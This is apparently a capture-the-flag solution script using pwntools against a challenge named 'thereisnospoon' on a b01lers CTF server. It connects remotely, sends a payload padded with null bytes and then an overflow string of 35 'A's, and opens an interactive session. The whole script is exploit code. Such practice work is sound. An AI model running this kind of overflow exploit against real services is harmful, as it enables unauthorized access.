from pwn import *

#p = process('./thereisnospoon')
p = remote('chal.ctf.b01lers.com', 1006)

payload = 'AAAA'+'\x00'*64
print p.recv()
p.send(payload)
print p.recv()
payload2 = 'A'*35
p.sendline(payload2)
print p.recv()
p.interactive()
